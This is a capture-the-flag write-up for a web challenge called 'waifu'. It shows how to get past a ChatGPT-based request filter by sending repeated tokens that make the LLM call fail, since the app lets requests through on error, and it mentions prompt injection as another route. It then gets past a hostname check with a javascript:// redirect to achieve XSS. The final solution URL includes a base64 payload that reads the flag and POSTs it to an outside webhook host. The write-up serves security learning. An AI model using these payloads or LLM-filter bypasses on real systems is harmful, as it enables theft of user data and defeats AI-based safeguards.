waifu
============

There are two WAFs that need to be bypassed in order to exploit an XSS vulnerability:

1. The ChatGPT WAF
2. The `(redirectUrl.hostname ?? '') !== new URL(defaultRedirect).hostname` check

# Bypassing the ChatGPT WAF

There are likely unintended solutions with prompt injection attacks to trick the response into being "all good". The intended solution was causing ChatGPT to raise an exception and not process the request. The application was designed to not use the ChatGPT WAF if an exception was raised.

`src/app/src/middleware/waifu.ts`
```ts
const waifuMiddleware = async (req: Request, res: Response, next: NextFunction) => {
    try {
        if (await analyseRequest(getRawRequest(req))) {
            sendError(res, 403, "oWo gotchya h4xor")
            return
        }
    } catch (e: any) {
        // Sometimes ChatGPT isn't working and it impacts our users :/
        // For now we just allow it through if ChatGPT is down
        console.log("something went wrong with my waifu 😭 probably it is down for some reason...")
    }
    next();
}
```

[Dropbox released some great research about repeated token attacks on LLMs](https://dropbox.tech/machine-learning/bye-bye-bye-evolution-of-repeated-token-attacks-on-chatgpt-models). The vulnerability was patched by OpenAI for ChatGPT by returning an "Invalid Request" response if a message contained too many repeating tokens. However, we could trigger this exception within our payload to cause a "Invalid Request".

Below was an example payload that would bypass the WAIFU by repeating the token `%61`.

```
/auth/?bypass=%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61&redirectTo=
```

# Bypassing the Hostname Check

The vulnerability was if an authenticated visited an `/auth/` page, they would be redirected using the `redirectTo` GET parameter. There was another validation check to try and prevent open redirect vuln.

```ts
const BROWSER_REDIRECT = `<html>
    <body>
        <script>
            window.location = "{REDIRECT}";
        </script>
    </body>
</html>`;

...

// Helpful at mitigating against other bots scanning for open redirect vulnerabilities
const sendBrowserRedirectResponse = (res: Response, redirectTo: string) => {
    const defaultRedirect = `${process.env.BASE_URL}/flag/`;
    if (typeof redirectTo !== "string") {
        redirectTo = defaultRedirect;
    }

    const redirectUrl = new URL(redirectTo as string, process.env.BASE_URL);
    // Prevent open redirect
    if ((redirectUrl.hostname ?? '') !== new URL(defaultRedirect).hostname) {
        redirectTo = defaultRedirect;
    }

    const encodedRedirect = encode(redirectTo);
    res.send(BROWSER_REDIRECT.replace("{REDIRECT}", encodedRedirect));
}
```

The `redirectTo` was parsed to a `URL` object and then the hostname was compared to the default one. There isn't any validations for protocols, so you could set the protocol to `javascript:`. To bypass the hostname check just set it to `javascript://waifu-app:3000/`, since when NodeJS constructs the URL object it will match the chars after `://` and before `/` as the hostname. Then we just inject in our javascript with a payload without quotes since the HTML encoding would break the syntax.

Below is an example solution:

```
/auth/?bypass=%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61&redirectTo=javascript://waifu-app:3000/%250aconst+urlParams+%3d+new+URLSearchParams(window.location.search)%3b%250aconst+exp+%3d+urlParams.get(0)%3b%250aeval(atob(exp))&0=ZmV0Y2goJy9mbGFnL2dldCcpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbih0ZXh0ID0%2BIGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS80MDAxOWUzMS1hNGEyLTQxZDItOTRkZS0wZjM1ODA4MTdlNzcveHNzJyx7bWV0aG9kOidQT1NUJyxib2R5OnRleHR9KSk%3D
```